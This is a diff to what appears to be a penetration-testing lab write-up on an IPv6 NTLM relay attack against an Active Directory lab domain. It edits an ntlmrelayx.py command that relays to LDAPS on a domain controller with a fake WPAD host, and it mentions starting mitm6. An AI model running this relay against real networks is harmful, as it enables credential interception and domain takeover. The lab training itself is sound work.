@@ -22,7 +22,7 @@ sec-fortress@Pwn-F0rk-3X3C:~$
 On your terminal do :
 
 ```shell
-sec-fortress@Pwn-F0rk-3X3C:~/PEH/AD$ ntlmrelayx.py -6 -t ldaps://192.168.0.110 -wh fakewpad.marvel.local -l bankai
+sec-fortress@Pwn-F0rk-3X3C:~/PEH/AD$ sudo ntlmrelayx.py -6 -t ldaps://192.168.0.110 -wh fakewpad.marvel.local -l bankai
 
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 
@@ -43,7 +43,7 @@ Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
 [*] Servers started, waiting for connections
 ```
 
-Note that `-6` represents IPv6 `-t` for targets `-wh` for fake web proxy auto-discovery `-l` will create a folder named **bankai**
+Note that `-6` represents IPv6 `-t` for DC-IP address `-wh` for fake web proxy auto-discovery `-l` will create a folder named **bankai**
 
 Then start up the `mitm6` server with the following command :
 
